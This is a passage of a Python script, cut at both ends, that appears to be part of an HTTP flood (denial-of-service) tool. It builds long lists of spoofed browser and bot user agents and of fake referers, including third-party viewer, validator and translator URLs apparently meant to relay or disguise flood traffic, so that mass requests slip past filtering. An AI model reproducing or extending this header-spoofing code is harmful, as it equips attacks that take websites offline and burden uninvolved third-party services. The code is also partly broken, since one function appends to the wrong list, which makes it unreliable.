        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    return headers_useragents


def referer_list():
    global headers_referers
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..")
    headers_referers.append("http://vk.com/profile.php?redirect=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=query?=query=..")
    headers_referers.append(
        "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882"
    )
    headers_referers.append(
        "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925"
    )
    headers_referers.append("http://yandex.ru/yandsearch?text=")
    headers_referers.append(
        "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832"
    )
    headers_referers.append("http://go.mail.ru/search?mail.ru=1&q=")
    headers_referers.append("http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..")
    headers_referers.append("http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..")
    headers_referers.append("http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..")
    headers_referers.append("http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..")
    headers_referers.append("http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..")
    headers_referers.append(
        "/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882"
    )
    headers_referers.append("http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..")
    headers_referers.append("http://www.google.ru/url?sa=t&rct=?j&q=&e..")
    headers_referers.append("http://help.baidu.com/searchResult?keywords=")
    headers_referers.append("http://www.bing.com/search?q=")
    headers_referers.append("https://www.yandex.com/yandsearch?text=")
    headers_referers.append("https://duckduckgo.com/?q=")
    headers_referers.append("http://www.ask.com/web?q=")
    headers_referers.append("http://search.aol.com/aol/search?q=")
    headers_referers.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=")
    headers_referers.append("https://drive.google.com/viewerng/viewer?url=")
    headers_referers.append("http://validator.w3.org/feed/check.cgi?url=")
    headers_referers.append("http://host-tracker.com/check_page/?furl=")
    headers_referers.append(
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL="
    )
    headers_referers.append("http://jigsaw.w3.org/css-validator/validator?uri=")
    headers_referers.append("https://add.my.yahoo.com/rss?url=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("https://steamcommunity.com/market/search?q=")
    headers_referers.append("http://filehippo.com/search?q=")
    headers_referers.append(
        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
    )
    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
    headers_referers.append("http://techtv.mit.edu/search?q=")
    headers_referers.append("http://www.ustream.tv/search?q=")
    headers_referers.append("http://www.ted.com/search?q=")
    headers_referers.append("http://funnymama.com/search?q=")
    headers_referers.append("http://itch.io/search?q=")
    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
    headers_referers.append("https://play.google.com/store/search?q=")
    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
    headers_referers.append("http://www.reddit.com/search?q=")
    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
    headers_referers.append("http://jobs.leidos.com/search?q=")
    headers_referers.append("http://jobs.bloomberg.com/search?q=")
    headers_referers.append("https://www.pinterest.com/search/?q=")
    headers_referers.append("http://millercenter.org/search?q=")
    headers_referers.append("https://www.npmjs.com/search?q=")
    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
    headers_referers.append("http://www.shodanhq.com/search?q=")
    headers_referers.append("http://ytmnd.com/search?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("https://steamcommunity.com/market/search?q=")
    headers_referers.append("http://filehippo.com/search?q=")
    headers_referers.append(
        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
    )
    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
    headers_referers.append("http://techtv.mit.edu/search?q=")
    headers_referers.append("http://www.ustream.tv/search?q=")
    headers_referers.append("http://www.ted.com/search?q=")
    headers_referers.append("http://funnymama.com/search?q=")
    headers_referers.append("http://itch.io/search?q=")
    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
    headers_referers.append("https://play.google.com/store/search?q=")
    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
    headers_referers.append("http://www.reddit.com/search?q=")
    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
    headers_referers.append("http://jobs.leidos.com/search?q=")
    headers_referers.append("http://jobs.bloomberg.com/search?q=")
    headers_referers.append("https://www.pinterest.com/search/?q=")
    headers_referers.append("http://millercenter.org/search?q=")
    headers_referers.append("https://www.npmjs.com/search?q=")
    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
    headers_referers.append("http://www.shodanhq.com/search?q=")
    headers_referers.append("http://ytmnd.com/search?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("https://steamcommunity.com/market/search?q=")
    headers_referers.append("http://filehippo.com/search?q=")
    headers_referers.append(
        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
    )
    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
    headers_referers.append("http://techtv.mit.edu/search?q=")
    headers_referers.append("http://www.ustream.tv/search?q=")
    headers_referers.append("http://www.ted.com/search?q=")
    headers_referers.append("http://funnymama.com/search?q=")
    headers_referers.append("http://itch.io/search?q=")
    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
    headers_referers.append("https://play.google.com/store/search?q=")
    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
    headers_referers.append("http://www.reddit.com/search?q=")
    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
    headers_referers.append("http://jobs.leidos.com/search?q=")
    headers_referers.append("http://jobs.bloomberg.com/search?q=")
    headers_referers.append("https://www.pinterest.com/search/?q=")
    headers_referers.append("http://millercenter.org/search?q=")
    headers_referers.append("https://www.npmjs.com/search?q=")
    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
    headers_referers.append("http://www.shodanhq.com/search?q=")
    headers_referers.append("http://ytmnd.com/search?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append("http://www.usatoday.com/search/results?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("https://steamcommunity.com/market/search?q=")
    headers_referers.append("http://filehippo.com/search?q=")
    headers_referers.append(
        "http://www.topsiteminecraft.com/site/pinterest.com/search?q="
    )
    headers_referers.append("http://eu.battle.net/wow/en/search?q=")
    headers_referers.append("http://engadget.search.aol.com/search?q=")
    headers_referers.append("http://careers.gatesfoundation.org/search?q=")
    headers_referers.append("http://techtv.mit.edu/search?q=")
    headers_referers.append("http://www.ustream.tv/search?q=")
    headers_referers.append("http://www.ted.com/search?q=")
    headers_referers.append("http://funnymama.com/search?q=")
    headers_referers.append("http://itch.io/search?q=")
    headers_referers.append("http://jobs.rbs.com/jobs/search?q=")
    headers_referers.append("http://taginfo.openstreetmap.org/search?q=")
    headers_referers.append("http://www.baoxaydung.com.vn/news/vn/search&q=")
    headers_referers.append("https://play.google.com/store/search?q=")
    headers_referers.append("http://www.tceq.texas.gov/@@tceq-search?q=")
    headers_referers.append("http://www.reddit.com/search?q=")
    headers_referers.append("http://www.bestbuytheater.com/events/search?q=")
    headers_referers.append("https://careers.carolinashealthcare.org/search?q=")
    headers_referers.append("http://jobs.leidos.com/search?q=")
    headers_referers.append("http://jobs.bloomberg.com/search?q=")
    headers_referers.append("https://www.pinterest.com/search/?q=")
    headers_referers.append("http://millercenter.org/search?q=")
    headers_referers.append("https://www.npmjs.com/search?q=")
    headers_referers.append("http://www.evidence.nhs.uk/search?q=")
    headers_referers.append("http://www.shodanhq.com/search?q=")
    headers_referers.append("http://ytmnd.com/search?q=")
    headers_referers.append(
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u="
    )
    headers_referers.append("http://www.google.com/?q=")
    headers_referers.append(
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u="
    )
    headers_referers.append("https://drive.google.com/viewerng/viewer?url=")
    headers_referers.append("http://www.google.com/translate?u=")
    headers_referers.append(
